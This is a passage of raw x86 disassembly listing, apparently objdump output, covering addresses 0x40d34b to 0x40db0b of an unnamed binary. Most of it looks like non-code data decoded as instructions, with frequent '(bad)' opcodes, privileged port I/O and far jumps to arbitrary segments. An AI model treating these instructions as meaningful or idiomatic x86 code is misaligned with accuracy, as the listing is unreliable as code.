  40d34b:	sub    eax,0x855ccbba
  40d350:	and    esp,esp
  40d352:	xchg   BYTE PTR [esi],bl
  40d354:	add    DWORD PTR [eax+ebx*8],esp
  40d357:	into   
  40d358:	adc    DWORD PTR [ebx+0x3c],eax
  40d35b:	sub    DWORD PTR [ecx-0x31],esp
  40d35e:	and    DWORD PTR [eax],0xa941142c
  40d364:	int    0x42
  40d366:	mov    ebx,DWORD PTR [ecx+0x3694506e]
  40d36c:	jge    0x40d320
  40d36e:	test   eax,0xf62015ce
  40d373:	cs stos DWORD PTR es:[edi],eax
  40d375:	in     eax,0x50
  40d377:	xchg   ebp,eax
  40d378:	int    0x5b
  40d37a:	jmp    0x3b0a117d
  40d37f:	adc    DWORD PTR [ecx-0x76],edx
  40d382:	jb     0x40d3a8
  40d384:	cmc    
  40d385:	push   0xb
  40d387:	out    dx,eax
  40d388:	and    DWORD PTR [edi+eiz*4],edx
  40d38b:	jae    0x40d388
  40d38d:	retf   
  40d38e:	mov    ah,0x7c
  40d390:	imul   esi,ebx,0x2a3b5741
  40d396:	inc    esp
  40d397:	stc    
  40d398:	push   0xffffffa1
  40d39a:	mov    esi,0x22ce3a79
  40d39f:	jp     0x40d3f3
  40d3a1:	repnz (bad) 
  40d3a3:	(bad)  
  40d3a4:	es add al,0xfa
  40d3a7:	push   eax
  40d3a8:	mov    ecx,0x1f72477f
  40d3ad:	jg     0x40d370
  40d3af:	(bad)  [esi]
  40d3b1:	jb     0x40d424
  40d3b3:	jmp    0x40d3d4
  40d3b5:	sbb    DWORD PTR [ecx],0x1d98bf3
  40d3bb:	mov    dl,BYTE PTR [eax-0xedbc633]
  40d3c1:	push   es
  40d3c2:	xor    BYTE PTR [eax-0x63898434],ah
  40d3c8:	adc    DWORD PTR [ebx],ebx
  40d3ca:	data16 sub al,BYTE PTR [esp+edi*4+0xde9e788]
  40d3d2:	fadd   DWORD PTR [ebx]
  40d3d4:	cli    
  40d3d5:	ss xchg edi,eax
  40d3d7:	or     al,0x8
  40d3d9:	pop    ebx
  40d3da:	jl     0x40d387
  40d3dc:	in     eax,0xb9
  40d3de:	test   DWORD PTR [edx-0x35],eax
  40d3e1:	xchg   ebp,eax
  40d3e2:	inc    ebp
  40d3e3:	popa   
  40d3e4:	mov    edx,0x88a09e5b
  40d3e9:	dec    edi
  40d3ea:	into   
  40d3eb:	mov    DWORD PTR [edx+0x4fa515f],edi
  40d3f1:	fidivr WORD PTR ds:0xb080e604
  40d3f7:	ror    BYTE PTR ss:[ebx-0x29b30bd5],cl
  40d3fe:	fs inc ecx
  40d400:	xchg   esp,eax
  40d401:	or     ecx,DWORD PTR [ebp-0x31]
  40d404:	xlat   BYTE PTR ds:[ebx]
  40d405:	xlat   BYTE PTR ds:[ebx]
  40d406:	stc    
  40d407:	icebp  
  40d408:	xchg   DWORD PTR [esi],edi
  40d40a:	jbe    0x40d481
  40d40c:	ds xor eax,0xcf89f72a
  40d412:	mov    ds:0xcac4733a,eax
  40d417:	dec    edx
  40d418:	(bad)  
  40d41a:	sub    dl,BYTE PTR [edi-0x667d511f]
  40d420:	mov    bl,0x30
  40d422:	sbb    eax,DWORD PTR [eax+ecx*2-0x20]
  40d426:	mov    eax,0x9e60cc3f
  40d42b:	adc    al,0x3
  40d42d:	mov    ds:0x941ed63d,al
  40d432:	xor    DWORD PTR [eax-0x4ddc5d47],esp
  40d438:	mov    es,WORD PTR [eax+0x1e063ed7]
  40d43e:	stos   BYTE PTR es:[edi],al
  40d43f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d441:	test   BYTE PTR [esi+0x7b18543],cl
  40d447:	pop    ecx
  40d448:	dec    BYTE PTR [esi-0x32]
  40d44b:	mov    edx,0xf2996015
  40d450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d451:	addr16 sub eax,0x70e1dc8c
  40d457:	push   esp
  40d458:	mov    dh,0x7b
  40d45a:	shr    DWORD PTR [edi],1
  40d45c:	lds    esp,FWORD PTR [eax+0x1b0eb53b]
  40d462:	shl    bl,1
  40d464:	inc    edi
  40d465:	jns    0x40d43c
  40d467:	scas   eax,DWORD PTR es:[edi]
  40d468:	daa    
  40d469:	push   DWORD PTR [ecx]
  40d46b:	sub    ah,BYTE PTR [eax]
  40d46d:	xchg   ecx,eax
  40d46e:	stos   BYTE PTR es:[edi],al
  40d46f:	cmovl  edi,DWORD PTR [eax]
  40d472:	in     eax,0x35
  40d474:	mov    esp,DWORD PTR [eax+0x6280419c]
  40d47a:	jg     0x40d4cf
  40d47c:	iret   
  40d47d:	sbb    al,0x85
  40d47f:	add    ebp,edx
  40d481:	inc    ecx
  40d482:	stc    
  40d483:	jo     0x40d45d
  40d485:	add    eax,0x7535f13c
  40d48a:	sub    esp,DWORD PTR [edi+edx*8+0x7247619c]
  40d491:	gs dec ebp
  40d493:	cdq    
  40d494:	leave  
  40d495:	add    ebx,DWORD PTR [ebx+0x5923fabf]
  40d49b:	sar    BYTE PTR [edx+0x638608af],0x6a
  40d4a2:	aas    
  40d4a3:	push   edi
  40d4a4:	sahf   
  40d4a5:	(bad)  
  40d4a6:	repz add bl,dl
  40d4a9:	inc    esi
  40d4aa:	lods   al,BYTE PTR ds:[esi]
  40d4ab:	push   eax
  40d4ac:	pop    ebx
  40d4ad:	pop    ss
  40d4ae:	pop    eax
  40d4af:	test   al,cl
  40d4b1:	ficom  WORD PTR [edx+0x5e]
  40d4b4:	xor    BYTE PTR [eax+0x15],0xd3
  40d4b8:	std    
  40d4b9:	mov    edx,0xdc79df40
  40d4be:	mov    dh,BYTE PTR [edi-0x2f]
  40d4c1:	mov    esi,0x581c281c
  40d4c6:	in     al,0x9
  40d4c8:	(bad)  
  40d4c9:	mov    WORD PTR [ecx+0x6d],ss
  40d4cc:	(bad)  
  40d4cd:	(bad)  
  40d4ce:	xchg   ebp,eax
  40d4cf:	cdq    
  40d4d0:	outs   dx,BYTE PTR ds:[esi]
  40d4d1:	sub    eax,0xc52b3d7
  40d4d6:	cwde   
  40d4d7:	out    dx,al
  40d4d8:	mov    ebp,0xef418578
  40d4dd:	sub    eax,0x1bafc51e
  40d4e2:	mov    esp,0x495c82db
  40d4e7:	dec    esp
  40d4e8:	sub    esp,DWORD PTR [edx+0x55002dbe]
  40d4ee:	push   edi
  40d4ef:	add    BYTE PTR [eax+0x4e],dh
  40d4f2:	mov    dh,0xee
  40d4f4:	xor    eax,ebx
  40d4f6:	cmc    
  40d4f7:	jp     0x40d504
  40d4f9:	pop    edi
  40d4fa:	(bad)  
  40d4fb:	mov    ds:0xc23b7670,eax
  40d500:	sbb    al,0xb4
  40d502:	repnz stos DWORD PTR es:[edi],eax
  40d504:	xchg   edi,eax
  40d505:	jo     0x40d4f9
  40d507:	mov    eax,0x4d612c1
  40d50c:	xchg   edi,eax
  40d50d:	jns    0x40d521
  40d50f:	pop    edx
  40d510:	sbb    ebx,ecx
  40d512:	pop    ds
  40d513:	or     BYTE PTR [ecx-0x6686f9ff],al
  40d519:	pusha  
  40d51a:	push   edx
  40d51b:	ins    BYTE PTR es:[edi],dx
  40d51c:	ret    0xcb48
  40d51f:	call   0xe46:0x7b5fe4ba
  40d526:	mov    bh,0xba
  40d528:	stc    
  40d529:	(bad)
  40d52c:	cmp    ch,BYTE PTR [edx+0x4ddf6732]
  40d532:	mov    dl,0xd3
  40d534:	add    edi,DWORD PTR [eax+0x6ae5f2e2]
  40d53a:	and    dl,dl
  40d53c:	mov    ebx,0xdf307b64
  40d541:	dec    ecx
  40d542:	repnz xor ecx,edx
  40d545:	cli    
  40d546:	add    BYTE PTR [edi+edx*4],0xc
  40d54a:	jecxz  0x40d59d
  40d54c:	sub    eax,0x41c97dc6
  40d551:	lds    edx,FWORD PTR [ecx]
  40d553:	(bad)  
  40d554:	out    0x6e,al
  40d556:	pop    ebp
  40d557:	jmp    0xa15aea3
  40d55c:	sbb    cl,BYTE PTR [esi]
  40d55e:	leave  
  40d55f:	add    eax,0xf9f15f62
  40d564:	jmp    0x1b48:0x4beeeec9
  40d56b:	mov    cl,0x9e
  40d56d:	je     0x40d55f
  40d56f:	pushf  
  40d570:	and    al,0xc3
  40d572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d573:	xor    bl,0x31
  40d576:	popa   
  40d577:	mov    cl,0xe1
  40d579:	xchg   ebp,eax
  40d57a:	pusha  
  40d57b:	out    0xcc,al
  40d57d:	(bad)  
  40d57e:	test   DWORD PTR [edx-0x54],0xdace9e25
  40d585:	mov    ecx,0x8ec639b3
  40d58a:	aam    0x38
  40d58c:	fstp   TBYTE PTR [ecx+esi*2]
  40d58f:	and    ebx,ebx
  40d591:	or     DWORD PTR [ecx],0x79
  40d594:	dec    esi
  40d595:	jno    0x40d530
  40d597:	pop    esi
  40d598:	(bad)  
  40d599:	lock jecxz 0x40d5be
  40d59c:	popf   
  40d59d:	repnz mov bl,0xcd
  40d5a0:	popa   
  40d5a1:	ja     0x40d54c
  40d5a3:	jbe    0x40d563
  40d5a5:	or     ch,al
  40d5a7:	lods   eax,DWORD PTR ds:[esi]
  40d5a8:	test   BYTE PTR [ebp+0x7],bl
  40d5ab:	addr16 mov ebx,0x58b4d4e8
  40d5b1:	mov    bl,0x9c
  40d5b3:	mov    cl,0x77
  40d5b5:	outs   dx,DWORD PTR ds:[esi]
  40d5b6:	push   ecx
  40d5b7:	add    edi,DWORD PTR es:[ecx]
  40d5ba:	adc    esp,esp
  40d5bc:	in     al,0xc9
  40d5be:	sub    BYTE PTR [esi+edi*8],cl
  40d5c1:	pushf  
  40d5c2:	or     esp,DWORD PTR [edx+0x54]
  40d5c5:	in     eax,dx
  40d5c6:	test   eax,0xa748dba
  40d5cb:	int3   
  40d5cc:	sub    ebx,ecx
  40d5ce:	jle    0x40d627
  40d5d0:	fldenv [eax+edi*4-0x709a9d8]
  40d5d7:	bound  ebp,QWORD PTR [edx+eax*1-0x136e0569]
  40d5de:	jmp    0x8c5a:0xa4049a97
  40d5e5:	test   eax,0xf2736e2c
  40d5ea:	fcomi  st,st(5)
  40d5ec:	(bad)  
  40d5ed:	jns    0x40d5bc
  40d5ef:	xchg   esi,eax
  40d5f0:	inc    esi
  40d5f1:	shl    eax,1
  40d5f3:	sub    ecx,ebp
  40d5f5:	retf   0x752f
  40d5f8:	idiv   BYTE PTR [edx+ebp*8-0x6c2be5f0]
  40d5ff:	xchg   DWORD PTR [ebx],eax
  40d601:	xchg   BYTE PTR [esi],cl
  40d603:	test   al,0x35
  40d605:	(bad)  
  40d606:	lods   al,BYTE PTR ds:[esi]
  40d607:	test   eax,0x49ffcca7
  40d60c:	fldcw  WORD PTR [eax-0x295b523a]
  40d612:	or     BYTE PTR [edx+ebx*1],dh
  40d615:	loop   0x40d5d2
  40d617:	mov    bl,0xfa
  40d619:	inc    edi
  40d61a:	xchg   edx,eax
  40d61b:	icebp  
  40d61c:	and    al,0x62
  40d61e:	and    DWORD PTR [ebp-0x4316dd7],esp
  40d624:	xchg   edx,eax
  40d625:	sbb    al,0xf6
  40d627:	(bad)  
  40d628:	pop    edx
  40d629:	aaa    
  40d62a:	pop    ebp
  40d62b:	adc    cl,dh
  40d62d:	test   BYTE PTR [esi+esi*4],0xef
  40d631:	mov    dh,0x25
  40d633:	pop    eax
  40d634:	hlt    
  40d635:	stos   DWORD PTR es:[edi],eax
  40d636:	idiv   ebp
  40d638:	sub    ebx,ecx
  40d63a:	mov    bl,0xe3
  40d63c:	fsub   QWORD PTR [eax+0x528f9147]
  40d642:	je     0x40d61d
  40d644:	loop   0x40d683
  40d646:	mov    edx,0x2a46427b
  40d64b:	xlat   BYTE PTR ds:[ebx]
  40d64c:	icebp  
  40d64d:	popf   
  40d64e:	pop    ebp
  40d64f:	jb     0x40d603
  40d651:	jl     0x40d618
  40d653:	sbb    eax,0xbe24367f
  40d658:	in     al,dx
  40d659:	or     bl,al
  40d65b:	mov    eax,ds:0xab6eb95a
  40d660:	sbb    ecx,DWORD PTR [ebp+0x55291a37]
  40d666:	adc    al,0x4
  40d668:	jno    0x40d6d9
  40d66a:	xchg   ecx,eax
  40d66b:	call   DWORD PTR [esi]
  40d66d:	dec    eax
  40d66e:	clc    
  40d66f:	cmp    al,0xfb
  40d671:	ret    
  40d672:	ds mov eax,0xd0007c78
  40d678:	out    dx,al
  40d679:	sbb    al,BYTE PTR [eax+0x17]
  40d67c:	dec    edi
  40d67d:	in     eax,0x21
  40d67f:	mov    ah,0xff
  40d681:	clc    
  40d682:	int3   
  40d683:	in     al,0x23
  40d685:	inc    edi
  40d686:	neg    BYTE PTR [ebp-0x513fb428]
  40d68c:	ss mov ah,0x49
  40d68f:	push   eax
  40d690:	in     eax,dx
  40d691:	bound  edx,QWORD PTR [edi+0x2d]
  40d694:	add    edi,edx
  40d696:	inc    ecx
  40d697:	out    dx,eax
  40d698:	dec    esi
  40d699:	pop    ss
  40d69a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d69b:	push   cs
  40d69c:	jbe    0x40d695
  40d69e:	pop    eax
  40d69f:	or     al,0xe1
  40d6a1:	lea    ebp,[edi+0x10cf383b]
  40d6a7:	cmp    eax,0x6b25e49e
  40d6ac:	mov    ds:0x80e20b29,al
  40d6b1:	push   es
  40d6b2:	sub    ebp,DWORD PTR [edi]
  40d6b4:	scas   eax,DWORD PTR es:[edi]
  40d6b5:	les    esp,FWORD PTR [eax+0x30a1214e]
  40d6bb:	mov    al,0xf6
  40d6bd:	inc    esi
  40d6be:	add    BYTE PTR ds:0xa106356b,ch
  40d6c4:	mov    ah,bh
  40d6c6:	cli    
  40d6c7:	cli    
  40d6c8:	test   al,0xcc
  40d6ca:	repnz lahf 
  40d6cc:	shl    BYTE PTR [ecx],1
  40d6ce:	mov    ecx,0x7458b3f0
  40d6d3:	cdq    
  40d6d4:	in     eax,dx
  40d6d5:	ss (bad) 
  40d6d7:	(bad)  
  40d6d8:	jp     0x40d6f1
  40d6da:	clc    
  40d6db:	cmp    eax,0xb7a847d
  40d6e0:	das    
  40d6e1:	es cmp eax,0x1428a663
  40d6e7:	mov    DWORD PTR [ecx+0x15],0xa77d9e66
  40d6ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6f0:	test   BYTE PTR [ebp-0x5c],ch
  40d6f3:	mov    DWORD PTR [esi-0x4644480f],eax
  40d6f9:	xor    edi,edx
  40d6fb:	lock cmp al,0x32
  40d6fe:	jns    0x40d722
  40d700:	mov    ah,0xf4
  40d702:	adc    DWORD PTR [edx+edi*8+0x8c643ac],ebp
  40d709:	test   DWORD PTR [edx],ebx
  40d70b:	pop    edx
  40d70c:	add    DWORD PTR [ecx+0x1],esi
  40d70f:	jle    0x40d6b3
  40d711:	cbw    
  40d713:	pop    ebx
  40d714:	jno    0x40d6b6
  40d716:	mov    bl,cl
  40d718:	loope  0x40d743
  40d71a:	jp     0x40d6bd
  40d71c:	call   0xb0ed:0x87689bef
  40d723:	xchg   al,dl
  40d725:	in     eax,0x4f
  40d727:	imul   DWORD PTR [edx+eiz*2+0x24]
  40d72b:	add    al,BYTE PTR [esi-0x1b]
  40d72e:	xlat   BYTE PTR ds:[ebx]
  40d72f:	or     DWORD PTR [ecx-0x4a],0xa4ce64cf
  40d736:	cmp    al,0x9
  40d738:	sub    al,0xc3
  40d73a:	or     ebx,esi
  40d73c:	and    ecx,DWORD PTR [edi+0x34102380]
  40d742:	lods   eax,DWORD PTR ds:[esi]
  40d743:	fwait
  40d744:	mov    ecx,0x7da74c2d
  40d749:	in     al,0x27
  40d74b:	xchg   esi,eax
  40d74c:	(bad)  
  40d74d:	ss mov ebx,0x4754d1b9
  40d753:	jl     0x40d6f5
  40d755:	adc    dl,BYTE PTR [edx]
  40d757:	and    eax,0xcd2b376e
  40d75c:	push   0xffffffe7
  40d75e:	push   esi
  40d75f:	repz xchg ch,cl
  40d762:	fbld   TBYTE PTR [esi-0x1c]
  40d765:	inc    edi
  40d766:	icebp  
  40d767:	mov    bl,0x54
  40d769:	hlt    
  40d76a:	push   ebx
  40d76b:	inc    ecx
  40d76c:	clc    
  40d76d:	fidivr WORD PTR [ebx-0x5d284fce]
  40d773:	sbb    BYTE PTR [ecx+0x397ed48f],dl
  40d779:	xchg   edx,eax
  40d77a:	or     eax,0xdf37a627
  40d77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d780:	test   BYTE PTR [edi+0x7d7e7d15],0xd4
  40d787:	imul   esi,DWORD PTR [esi+0x12ac23a2],0x27
  40d78e:	jmp    0x404c:0xb12e54c0
  40d795:	sar    BYTE PTR [ecx],0xa5
  40d798:	rol    DWORD PTR [ebp+0x50],cl
  40d79b:	mov    esi,0x924560a9
  40d7a0:	and    DWORD PTR [ecx+eiz*1-0x193ba4d2],ebx
  40d7a7:	fisub  DWORD PTR [eax+0x1aa21ee2]
  40d7ad:	push   edi
  40d7ae:	(bad)
  40d7b2:	(bad)  
  40d7b3:	ds lahf 
  40d7b5:	dec    ecx
  40d7b6:	inc    esp
  40d7b7:	fmul   DWORD PTR [esi+edx*8]
  40d7ba:	add    ebp,DWORD PTR [ebx-0x4f]
  40d7bd:	sub    BYTE PTR [eax-0x534beebc],dl
  40d7c3:	cmp    al,BYTE PTR [ecx-0x3535168]
  40d7c9:	popa   
  40d7ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7cb:	sub    al,0x2b
  40d7cd:	mov    eax,0x9a9da279
  40d7d2:	mov    eax,ds:0xc964cf8d
  40d7d7:	or     BYTE PTR [ecx-0x1dff061f],cl
  40d7dd:	(bad)  
  40d7df:	push   ss
  40d7e0:	in     al,dx
  40d7e1:	adc    BYTE PTR [ecx+eiz*2],ah
  40d7e4:	daa    
  40d7e5:	shl    BYTE PTR [eax+0xf3db009],1
  40d7eb:	ja     0x40d867
  40d7ed:	and    BYTE PTR [edx+ebx*1+0x12d13b4d],0x18
  40d7f5:	mov    al,ds:0x82a97b04
  40d7fa:	call   0x25793db4
  40d7ff:	push   0xffffffd4
  40d801:	nop
  40d802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d803:	cmp    esi,DWORD PTR [ecx]
  40d805:	daa    
  40d806:	inc    ebx
  40d807:	lods   al,BYTE PTR ds:[esi]
  40d808:	retf   0x9195
  40d80b:	lods   al,BYTE PTR ds:[esi]
  40d80c:	push   0xdf21a675
  40d811:	daa    
  40d812:	push   eax
  40d813:	adc    DWORD PTR [eax-0x5d],esi
  40d816:	in     eax,dx
  40d817:	fimul  DWORD PTR [ebp-0x5cd17486]
  40d81d:	(bad)  [ecx+0x7]
  40d820:	clc    
  40d821:	xchg   BYTE PTR [eax-0x4d],cl
  40d824:	in     al,dx
  40d825:	xchg   BYTE PTR [edi],ah
  40d827:	xchg   edx,eax
  40d828:	(bad)  
  40d829:	repz cli 
  40d82b:	push   di
  40d82d:	int    0x44
  40d82f:	adc    eax,0x3b3ea8f0
  40d834:	sbb    DWORD PTR [edi+0x26],ebp
  40d837:	mov    esp,esp
  40d839:	sbb    eax,0x564e7565
  40d83e:	sub    al,0xbd
  40d840:	mov    ecx,0xd5030484
  40d845:	cs mov esp,0x1e15faed
  40d84b:	mov    BYTE PTR [ebx+0x52],dh
  40d84e:	cmp    DWORD PTR [ecx+0x1f2755c4],ecx
  40d854:	adc    ebx,DWORD PTR ds:0xbc15e529
  40d85a:	mov    dh,dh
  40d85c:	ja     0x40d8b5
  40d85e:	xchg   DWORD PTR [ebx-0x5c],eax
  40d861:	mov    esp,0xd1aace57
  40d866:	add    BYTE PTR [esp+ebp*8],0x9
  40d86a:	lds    eax,FWORD PTR [esi+0x5d61e2e7]
  40d870:	mov    al,ds:0xda78b6c0
  40d875:	xlat   BYTE PTR ds:[ebx]
  40d876:	stc    
  40d877:	adc    esi,ebp
  40d879:	adc    BYTE PTR [edi+0x63],dh
  40d87c:	mul    BYTE PTR ds:0x4fc45bf3
  40d882:	jb     0x40d8ee
  40d884:	shl    DWORD PTR [eax+0x17],cl
  40d887:	or     eax,0xc95e9c9f
  40d88c:	mov    DWORD PTR ds:0x5c0309de,eax
  40d892:	ret    0x9773
  40d895:	dec    esi
  40d896:	xor    eax,0x2eb05e94
  40d89b:	ret    
  40d89c:	mov    cl,0x96
  40d89e:	mov    ebp,DWORD PTR [ebp+eax*4-0x439ebff5]
  40d8a5:	sub    eax,0x5ba62590
  40d8aa:	fcom   st(6)
  40d8ac:	retf   
  40d8ad:	dec    edi
  40d8ae:	int3   
  40d8af:	jns    0x40d897
  40d8b1:	pop    ebp
  40d8b2:	clc    
  40d8b3:	xor    eax,0x3a2f9be
  40d8b8:	stos   BYTE PTR es:[edi],al
  40d8b9:	mov    al,ds:0x289d3f66
  40d8be:	dec    ebp
  40d8bf:	jmp    esp
  40d8c1:	out    dx,al
  40d8c2:	stc    
  40d8c3:	xor    DWORD PTR [ebx+eiz*2-0x489dbe70],0xffffffbd
  40d8cb:	sub    eax,0x930e7ad9
  40d8d0:	sbb    al,0x60
  40d8d2:	rcr    DWORD PTR [eax-0x4ccbda8f],cl
  40d8d8:	mov    ecx,0xe7f42c46
  40d8dd:	ins    DWORD PTR es:[edi],dx
  40d8de:	or     DWORD PTR [edi-0x2f],esp
  40d8e1:	nop
  40d8e2:	faddp  st(3),st
  40d8e4:	aaa    
  40d8e5:	loope  0x40d955
  40d8e7:	into   
  40d8e8:	out    0x4a,al
  40d8ea:	push   ecx
  40d8eb:	and    eax,0x61a36a5b
  40d8f0:	out    0x1e,al
  40d8f2:	or     DWORD PTR [eax+0x14bf685],ecx
  40d8f8:	sahf   
  40d8f9:	xlat   BYTE PTR ds:[ebx]
  40d8fa:	hlt    
  40d8fb:	inc    edx
  40d8fc:	pop    esp
  40d8fd:	xor    BYTE PTR ds:0xe726dc2a,ah
  40d903:	add    eax,0x3a8d7fe7
  40d908:	add    DWORD PTR [edx-0x6259fd75],0xffffff87
  40d90f:	fs push ecx
  40d911:	aam    0x4b
  40d913:	inc    ebx
  40d914:	push   edx
  40d915:	sbb    eax,0x11cb7140
  40d91a:	lea    edx,[ebx-0x8f18bd2]
  40d920:	and    eax,0x493db949
  40d925:	repnz push 0xffffffb2
  40d928:	(bad)  
  40d929:	adc    ch,BYTE PTR [ecx-0xa8e5190]
  40d92f:	mov    eax,0xfdc080ec
  40d934:	(bad)  
  40d935:	pop    ds
  40d936:	mov    ch,0x70
  40d938:	push   ebp
  40d939:	inc    esp
  40d93a:	arpl   WORD PTR [edx+ebp*8+0x1900c3fd],ax
  40d941:	js     0x40d90d
  40d943:	(bad)  
  40d944:	jp     0x40d927
  40d946:	shl    BYTE PTR [edx],cl
  40d948:	popf   
  40d949:	xor    edi,edx
  40d94b:	inc    ecx
  40d94c:	mov    ebx,esp
  40d94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d94f:	shr    BYTE PTR [ebp-0x2c],0xbc
  40d953:	inc    esi
  40d954:	push   esp
  40d955:	rol    DWORD PTR [esi-0x3f9f2542],cl
  40d95b:	mov    esp,0x5894792a
  40d960:	add    bh,BYTE PTR [edi+ebp*8]
  40d963:	aas    
  40d964:	mov    ebp,0x9376a32a
  40d969:	leave  
  40d96a:	and    dh,cl
  40d96c:	dec    esp
  40d96d:	pop    es
  40d96e:	mov    ds:0x4bbf17d9,al
  40d973:	test   al,0x8e
  40d975:	mov    ds:0xf0e22a44,al
  40d97a:	(bad)  
  40d97b:	cmp    DWORD PTR ds:0x58e516da,esp
  40d981:	sbb    DWORD PTR [esi-0x34bb2a79],eax
  40d987:	xor    al,0xc
  40d989:	add    ah,BYTE PTR [ecx+edi*2+0x3a]
  40d98d:	loope  0x40d95c
  40d98f:	je     0x40d9d0
  40d991:	push   eax
  40d992:	inc    ebp
  40d993:	pop    ebp
  40d994:	push   ebx
  40d995:	push   esi
  40d996:	lock pop ds
  40d998:	sub    edi,DWORD PTR [ebx]
  40d99a:	inc    esi
  40d99b:	and    eax,0x75216afa
  40d9a0:	jmp    0x40d9eb
  40d9a2:	out    dx,al
  40d9a3:	cmp    edx,edx
  40d9a5:	in     al,0xab
  40d9a7:	stos   DWORD PTR es:[edi],eax
  40d9a8:	dec    ebp
  40d9a9:	adc    eax,0xb8a053d1
  40d9ae:	mov    dh,0xb1
  40d9b0:	jg     0x40d969
  40d9b2:	sub    ch,dh
  40d9b4:	cmp    bh,BYTE PTR ds:0x11c265ab
  40d9ba:	fistp  DWORD PTR ds:0x44ac99a8
  40d9c0:	addr16 test eax,0x379e9d
  40d9c6:	mov    eax,ds:0x733ff3f5
  40d9cb:	and    bh,BYTE PTR [esi+0x2030b6cc]
  40d9d1:	aam    0x90
  40d9d3:	mov    ch,0x67
  40d9d5:	pushf  
  40d9d6:	or     DWORD PTR [ecx-0x71c2d203],ecx
  40d9dc:	enter  0x10a7,0x72
  40d9e0:	xor    dh,BYTE PTR [ebp-0x4647dd01]
  40d9e6:	ret    
  40d9e7:	fwait
  40d9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e9:	mov    ebx,0x1140a7a9
  40d9ee:	push   ebp
  40d9ef:	xchg   edx,eax
  40d9f0:	out    dx,al
  40d9f1:	sbb    al,0x22
  40d9f3:	into   
  40d9f4:	fld    TBYTE PTR fs:[esp+edi*8-0x45]
  40d9f9:	push   edx
  40d9fa:	cmp    edi,esi
  40d9fc:	sub    DWORD PTR [ebp+0x5424362a],ebp
  40da02:	sbb    al,0x34
  40da04:	loopne 0x40da1f
  40da06:	cmp    eax,0xc3b5f0d5
  40da0b:	mov    bl,0x6b
  40da0d:	mov    esi,0xeb8a1320
  40da12:	xchg   ebp,eax
  40da13:	pop    esp
  40da14:	retf   
  40da15:	out    0xcf,al
  40da17:	or     BYTE PTR [eax-0x18],ch
  40da1a:	cwde   
  40da1b:	std    
  40da1c:	inc    edx
  40da1d:	jp     0x40d9e9
  40da1f:	lods   al,BYTE PTR ds:[esi]
  40da20:	loopne 0x40da15
  40da22:	(bad)  
  40da25:	cwde   
  40da26:	dec    eax
  40da27:	pop    ecx
  40da28:	out    0xf0,eax
  40da2a:	cs scas eax,DWORD PTR es:[edi]
  40da2c:	lods   al,BYTE PTR ds:[esi]
  40da2d:	aas    
  40da2e:	xor    BYTE PTR [esi],ch
  40da30:	(bad)  
  40da31:	fbld   TBYTE PTR [esi+0x3785ac64]
  40da37:	daa    
  40da38:	(bad)  
  40da3a:	rcl    DWORD PTR [ebp-0x57],1
  40da3d:	pop    edi
  40da3e:	fld    st(6)
  40da40:	fmul   st(5),st
  40da42:	and    DWORD PTR [ebx-0x2325a5f2],ebx
  40da48:	idiv   BYTE PTR [ebx+0x37]
  40da4b:	mov    al,ds:0x78503629
  40da50:	fs dec ebp
  40da52:	mov    al,0x2
  40da54:	out    dx,eax
  40da55:	lock fs out dx,eax
  40da58:	pop    esp
  40da59:	dec    edx
  40da5a:	test   eax,0x58a60b1f
  40da5f:	sbb    eax,0x9b5a11e9
  40da64:	mov    dh,0xae
  40da66:	push   0x844c5734
  40da6b:	xchg   edx,eax
  40da6c:	jmp    0x7544:0x3966d7c0
  40da73:	xor    esp,0xe0069a1a
  40da79:	(bad)  
  40da7a:	lods   eax,DWORD PTR ds:[esi]
  40da7b:	sbb    eax,0xb099a1a0
  40da80:	or     al,0xa9
  40da82:	sub    DWORD PTR [edx-0x4f],ebp
  40da85:	xchg   edx,eax
  40da86:	xchg   ebp,eax
  40da87:	lods   eax,DWORD PTR ds:[esi]
  40da88:	repnz cld 
  40da8a:	test   al,0x7f
  40da8c:	jmp    0x40dab0
  40da8e:	hlt    
  40da8f:	rcr    DWORD PTR [eax-0x3fdc7fa2],cl
  40da95:	jo     0x40da6b
  40da97:	and    BYTE PTR [ebx],al
  40da99:	in     eax,dx
  40da9a:	prefetch BYTE PTR [edx]
  40da9d:	adc    DWORD PTR [ebx+0x3722d5c5],edx
  40daa3:	mov    eax,0xb6aa2e3c
  40daa8:	sub    BYTE PTR [edi+0x17],al
  40daab:	into   
  40daac:	push   esi
  40daad:	mov    al,ds:0x832f6ff
  40dab2:	or     ah,BYTE PTR [ebp-0x3a]
  40dab5:	aas    
  40dab6:	xchg   edx,eax
  40dab7:	fs cmp al,0x6e
  40daba:	dec    eax
  40dabb:	lock xor eax,0xc7cae0cd
  40dac1:	pop    edx
  40dac2:	add    cl,dl
  40dac4:	dec    eax
  40dac5:	in     eax,0x43
  40dac7:	cmp    al,0xc9
  40dac9:	stc    
  40daca:	jmp    FWORD PTR [ecx+0x32]
  40dacd:	pop    ebp
  40dace:	jg     0x40db30
  40dad0:	stc    
  40dad1:	fild   WORD PTR [eax]
  40dad3:	mov    DWORD PTR [ebp+0x645f087c],eax
  40dad9:	or     BYTE PTR [ebx+ebx*1+0x62e4043e],0xd4
  40dae1:	rcr    DWORD PTR [ebx-0xe92c4d4],1
  40dae7:	dec    esp
  40dae8:	inc    edx
  40dae9:	stc    
  40daea:	ret    0xc2f7
  40daed:	mov    dl,0xd
  40daef:	idiv   DWORD PTR [ebx-0x21]
  40daf2:	mov    edx,0x3b93be6f
  40daf7:	cmp    BYTE PTR [ecx+0x1d],cl
  40dafa:	pop    ss
  40dafb:	cmp    BYTE PTR [ecx],dl
  40dafd:	(bad)  
  40dafe:	stos   DWORD PTR es:[edi],eax
  40daff:	inc    esi
  40db00:	aam    0xee
  40db02:	ret    0x8b9a
  40db05:	dec    eax
  40db06:	ins    BYTE PTR es:[edi],dx
  40db07:	mov    ah,bh
  40db09:	mov    eax,ebx
  40db0b:	inc    ecx
